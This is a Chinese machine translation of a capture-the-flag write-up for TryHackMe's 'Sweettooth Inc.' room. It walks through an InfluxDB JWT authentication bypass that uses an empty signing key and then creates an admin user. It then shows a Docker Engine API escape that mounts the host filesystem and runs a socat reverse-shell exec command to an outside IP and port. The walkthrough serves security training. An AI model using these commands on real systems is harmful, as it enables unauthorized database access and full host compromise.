<html>
<head>
<title>TryHackMe - Sweettooth Inc. (non port forward method)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe - Sweettooth公司(非端口转发方法)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-sweettooth-inc-non-port-forward-method-a658d587c481?source=collection_archive---------2-----------------------#2021-08-02">https://infosecwriteups.com/tryhackme-sweettooth-inc-non-port-forward-method-a658d587c481?source=collection_archive---------2-----------------------#2021-08-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/bb698dfd9a1e4544b70687ef477622db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*uUgGmI_zQUDTJNqc.jpeg"/></div></div></figure><p id="1e41" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">大家好，这将是关于<a class="ae kw" href="https://tryhackme.com/" rel="noopener ugc nofollow" target="_blank"> TryHackMe </a>的<a class="ae kw" href="https://tryhackme.com/room/sweettoothinc" rel="noopener ugc nofollow" target="_blank"> Sweettooth Inc .房间</a>的报道。在这个房间中，我们必须首先列举一个易受攻击的数据库，在这个数据库中，我们必须创建一个JWT令牌来登录该数据库，并在那里获取系统的SSH凭据。一旦我们在系统上站稳脚跟，我们看到它是一个docker容器，带有一个公开的Docker引擎API。我们可以用它来突破docker容器以访问主机。</p><p id="d27b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">从nmap扫描开始:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="1395" class="lg lh iq lc b gy li lj l lk ll"># Nmap 7.91 scan initiated Fri Jul 23 18:32:34 2021 as: nmap -sT -p- -sVC -oN services.nmap --open -n -v -T4 10.10.219.28<br/>Nmap scan report for 10.10.219.28<br/>Host is up (0.19s latency).<br/>Not shown: 59487 closed ports, 6044 filtered ports<br/>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit<br/>PORT      STATE SERVICE VERSION<br/>111/tcp   open  rpcbind 2-4 (RPC #100000)<br/>| rpcinfo: <br/>|   program version    port/proto  service<br/>|   100000  2,3,4        111/tcp   rpcbind<br/>|   100000  2,3,4        111/udp   rpcbind<br/>|   100000  3,4          111/tcp6  rpcbind<br/>|   100000  3,4          111/udp6  rpcbind<br/>|   100024  1          34421/udp6  status<br/>|   100024  1          40752/tcp   status<br/>|   100024  1          43744/udp   status<br/>|_  100024  1          45271/tcp6  status<br/>2222/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)<br/>|   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)<br/>|   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)<br/>|_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)<br/>8086/tcp  open  http    InfluxDB http admin 1.3.0<br/>|_http-title: Site doesn't have a title (text/plain; charset=utf-8).<br/>40752/tcp open  status  1 (RPC #100024)<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="9fa3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">需要注意的要点:</p><ul class=""><li id="a649" class="lm ln iq ka b kb kc kf kg kj lo kn lp kr lq kv lr ls lt lu bi translated">端口2222: SSH (OpenSSH 6.7p1)</li><li id="1cf2" class="lm ln iq ka b kb lv kf lw kj lx kn ly kr lz kv lr ls lt lu bi translated">端口8086: InfluxDB http admin 1.3.0</li><li id="5322" class="lm ln iq ka b kb lv kf lw kj lx kn ly kr lz kv lr ls lt lu bi translated">设备可能是Linux系统</li></ul><p id="c073" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">通过快速的谷歌搜索，我们得知在InfluxDB:<a class="ae kw" href="https://github.com/influxdata/influxdb/issues/12927" rel="noopener ugc nofollow" target="_blank">https://github.com/influxdata/influxdb/issues/12927</a>中存在一个密码绕过漏洞</p><p id="c1f2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这里有一篇文章证实了我们的InfluxDB版本1.3.0确实存在漏洞，并解释了如何利用它:<a class="ae kw" href="https://www.komodosec.com/post/when-all-else-fails-find-a-0-day" rel="noopener ugc nofollow" target="_blank">https://www . komodosec . com/post/when-all-else-fails-find-a-0-day</a></p><p id="0472" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">要利用这一点，我们首先需要一个有效的用户名。这可以通过简单地访问web浏览器上的<code class="fe ma mb mc lc b">/debug/requests</code>端点来完成。该URL类似于下面的内容:<code class="fe ma mb mc lc b">http://10.10.219.28:8086/debug/requests</code></p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi md"><img src="../Images/59cfb7d864cbc538f169819b2c5ce473.png" data-original-src="https://miro.medium.com/v2/resize:fit:594/format:webp/1*lk5mCmc92uqx-O-EG0-ZKg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">找到数据库用户名</figcaption></figure><p id="03d6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">数据库用户名:o5yY6yya</p><p id="1de9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在，为了制作JWT令牌，我们需要设置以下参数:</p><ul class=""><li id="7fe5" class="lm ln iq ka b kb kc kf kg kj lo kn lp kr lq kv lr ls lt lu bi translated">用户名:o5yY6yya</li><li id="e989" class="lm ln iq ka b kb lv kf lw kj lx kn ly kr lz kv lr ls lt lu bi translated">有效截止日期</li><li id="d598" class="lm ln iq ka b kb lv kf lw kj lx kn ly kr lz kv lr ls lt lu bi translated">空密钥</li></ul><p id="15b9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">它应该是这样的:</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mi"><img src="../Images/babaa4870d4e465981b868a265e1768e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NuUCS0qWx3hHG8NKx5T01w.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">使用jwt.io创建我们的令牌</figcaption></figure><p id="c8bd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">InfluxDB API文档很好地解释了如何使用它:</p><ul class=""><li id="fcd6" class="lm ln iq ka b kb kc kf kg kj lo kn lp kr lq kv lr ls lt lu bi translated"><a class="ae kw" href="https://docs.influxdata.com/influxdb/v1.8/guides/query_data/" rel="noopener ugc nofollow" target="_blank">https://docs . influx data . com/influx db/v 1.8/guides/query _ data/</a></li><li id="ca33" class="lm ln iq ka b kb lv kf lw kj lx kn ly kr lz kv lr ls lt lu bi translated"><a class="ae kw" href="https://docs.influxdata.com/influxdb/v1.8/administration/authentication_and_authorization/" rel="noopener ugc nofollow" target="_blank">https://docs . influx data . com/influx db/v 1.8/administration/authentic ation _ and _ authorization/</a></li></ul><p id="2ed5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">以下是一些有助于完成任务的查询:</p><ul class=""><li id="f4ee" class="lm ln iq ka b kb kc kf kg kj lo kn lp kr lq kv lr ls lt lu bi translated">显示数据库:(为了更好的可读性，我使用<a class="ae kw" href="https://github.com/stedolan/jq" rel="noopener ugc nofollow" target="_blank"> jq </a>解析json)</li></ul><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="19f8" class="lg lh iq lc b gy li lj l lk ll">curl -G 'http://10.10.219.28:8086/query?' --data-urlencode 'q=SHOW DATABASES;'  -H 'Authorization: Bearer &lt;jwt token here&gt;' | jq</span></pre><ul class=""><li id="daa9" class="lm ln iq ka b kb kc kf kg kj lo kn lp kr lq kv lr ls lt lu bi translated">要显示所选数据库中的表(在InfluxDB中表被称为“series ”):</li></ul><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="8ee5" class="lg lh iq lc b gy li lj l lk ll">curl -G 'http://10.10.219.28:8086/query?' --data-urlencode "db=mixer" --data-urlencode 'q=SHOW SERIES'  -H 'Authorization: Bearer &lt;jwt token here&gt;' | jq</span></pre><ul class=""><li id="4864" class="lm ln iq ka b kb kc kf kg kj lo kn lp kr lq kv lr ls lt lu bi translated">要显示系列的内容:</li></ul><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="cc9d" class="lg lh iq lc b gy li lj l lk ll">curl -G 'http://10.10.219.28:8086/query?' --data-urlencode "db=tanks" --data-urlencode 'q=SELECT * FROM water_tank'  -H 'Authorization: Bearer &lt;jwt token here&gt;' | jq</span></pre><p id="c222" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">你也可以创建一个特权账户，然后不用走curl的路，只需使用<a class="ae kw" href="https://docs.influxdata.com/influxdb/v1.8/tools/shell/" rel="noopener ugc nofollow" target="_blank">流入CLI </a>工具。要创建特权帐户，我们需要指定设置了“所有特权”特权的用户名和密码。</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="2776" class="lg lh iq lc b gy li lj l lk ll">curl -X POST '<a class="ae kw" href="http://10.10.219.28:8086/query?'" rel="noopener ugc nofollow" target="_blank">http://10.10.219.28:8086/query?'</a> --data-urlencode "q=CREATE USER xplo1t with PASSWORD 'xplo1t' with ALL PRIVILEGES"  -H 'Authorization: Bearer &lt;jwt token here&gt;'</span></pre><p id="b650" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在数据库内部，我们可以获得SSH凭证</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/f0dbf940390b5a2a8cc30c85e695a8a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:772/format:webp/1*sbwmU4P7jg63S9R21BXxuQ.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">现在唯一要做的就是登录:)</figcaption></figure><p id="22d8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">SSH使用这些凭证登录。通过一些枚举，我们看到我们在一个docker容器中。在根目录中，有两个我们可能感兴趣的可疑文件:</p><ul class=""><li id="ce9e" class="lm ln iq ka b kb kc kf kg kj lo kn lp kr lq kv lr ls lt lu bi translated">entrypoint.sh</li><li id="caef" class="lm ln iq ka b kb lv kf lw kj lx kn ly kr lz kv lr ls lt lu bi translated">initializeandquery.sh</li></ul><p id="3793" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在查看文件之后,‘initializeandquery . sh’文件给出了一个提示，即端口8080正被用于查询docker容器。</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mk"><img src="../Images/79fae727fb32d7d3f57730f36bbbf231.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nGhEIknhkpyJ-xvx714nNA.png"/></div></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">检查initializeandquery.sh的底部</figcaption></figure><p id="8845" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果你以前没有用过这个，文档可以帮你:【https://docs.docker.com/engine/api/v1.38/<a class="ae kw" href="https://docs.docker.com/engine/api/v1.38/" rel="noopener ugc nofollow" target="_blank"/>。</p><p id="1d47" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们看看有哪些容器:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="b266" class="lg lh iq lc b gy li lj l lk ll">curl -X GET <a class="ae kw" href="http://localhost:8080/containers/json" rel="noopener ugc nofollow" target="_blank">http://localhost:8080/containers/json</a></span></pre><p id="01a7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">从这个命令的输出中，我们得到图像名为‘sweettoothinc’。</p><p id="62b6" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们尝试添加我们自己的图像文件。<br/>我制作了一个json映像(命名为image.json ),配置如下:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="bb84" class="lg lh iq lc b gy li lj l lk ll">{<br/> "Image":"sweettoothinc",<br/> "cmd":["/bin/bash"],<br/> "Binds": [<br/>  "/:/mnt:rw"<br/> ]<br/>}</span></pre><p id="cef5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">当我们启动这个容器时，<code class="fe ma mb mc lc b">/bin/bash</code>运行，主机系统的整个文件系统将被挂载到<code class="fe ma mb mc lc b">/mnt</code>目录中。因此，我们可以完全读/写访问主机上的所有文件。</p><p id="ace5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">上传容器:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="f67b" class="lg lh iq lc b gy li lj l lk ll">curl -X POST -H "Content-Type: application/json" -d <a class="ae kw" href="http://twitter.com/image" rel="noopener ugc nofollow" target="_blank">@image</a>.json <a class="ae kw" href="http://localhost:8080/containers/create" rel="noopener ugc nofollow" target="_blank">http://localhost:8080/containers/create</a></span><span id="17c7" class="lg lh iq lc b gy ml lj l lk ll">Output:<br/>{"Id":"2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9","Warnings":null}</span></pre><p id="12c5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">记下我们新容器的容器ID</p><blockquote class="mm mn mo"><p id="bcf0" class="jy jz mp ka b kb kc kd ke kf kg kh ki mq kk kl km mr ko kp kq ms ks kt ku kv ij bi translated">集装箱编号:2b 5918d 16 a 56 FB 462 b 32 bcfd 72924d 925d 9 D5 b 31 e 7 ce 75 af 226432 D2 e 54d 7 c 9</p></blockquote><p id="b9c3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们试着启动它:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="2fde" class="lg lh iq lc b gy li lj l lk ll">curl -X POST  <a class="ae kw" href="http://localhost:8080/containers/2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9/start" rel="noopener ugc nofollow" target="_blank">http://localhost:8080/containers/2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9/start</a></span><span id="419a" class="lg lh iq lc b gy ml lj l lk ll"><br/>Output: No output. Means it started successfully</span></pre><p id="c25d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因为我们在这个容器中拥有主机的整个文件系统，所以我们也拥有它们。要获得反向shell，我们需要创建一个exec实例。它允许我们在运行的容器中执行命令。</p><p id="93b8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">使用我们之前获得的容器ID，用socat反向shell创建一个新的exec实例:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="f0a2" class="lg lh iq lc b gy li lj l lk ll">curl -i -s -X POST -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["socat" ,"TCP:10.17.10.220:1337", "EXEC:sh"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' <a class="ae kw" href="http://localhost:8080/containers/a0088a8236d254b0296eac76565695190682b98c323709f65c0958fdd42eda19/exec" rel="noopener ugc nofollow" target="_blank">http://localhost:8080/containers/</a>2b5918d16a56fb462b32bcfd72924d925d9d5b31e7cee75af226432d2e54d7c9<a class="ae kw" href="http://localhost:8080/containers/a0088a8236d254b0296eac76565695190682b98c323709f65c0958fdd42eda19/exec" rel="noopener ugc nofollow" target="_blank">/exec</a></span><span id="624b" class="lg lh iq lc b gy ml lj l lk ll">Output:<br/>{"Id":"da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48"}</span></pre><blockquote class="mm mn mo"><p id="9343" class="jy jz mp ka b kb kc kd ke kf kg kh ki mq kk kl km mr ko kp kq ms ks kt ku kv ij bi translated">exec ID:da3d 7220 e 76 cf 0 c 291311 f 35773 C3 e 12283 ff 6929 e 21 BC 81 b 0567 CD 3 EB 43 ce 48</p></blockquote><p id="9af4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在本地机器的同一个1337端口上设置一个监听器。并启动exec实例:</p><pre class="kx ky kz la gt lb lc ld le aw lf bi"><span id="4d93" class="lg lh iq lc b gy li lj l lk ll">curl -i -s -X POST -H 'Content-Type: application/json' --data-binary '{"Detach": false,"Tty": false}' http://localhost:8080/exec/da3d7220e76cf0c291311f35773c3e12283ff6929e21bc81b0567cd3eb43ce48/start</span></pre><p id="bb0c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在监听器上，应该有一个shell在等着你</p><figure class="kx ky kz la gt jr gh gi paragraph-image"><div class="gh gi mt"><img src="../Images/01999eee500b37e503e5c5a9b4b69cae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1068/format:webp/1*vxFXVu4XR3YybuRRmGXRXg.png"/></div><figcaption class="me mf gj gh gi mg mh bd b be z dk translated">旗帜</figcaption></figure><p id="78cf" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果你想了解更多，这里有一篇文章:<a class="ae kw" href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" rel="noopener ugc nofollow" target="_blank">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a>。谢谢你读到这里。下次见。</p></div></div>    
</body>
</html>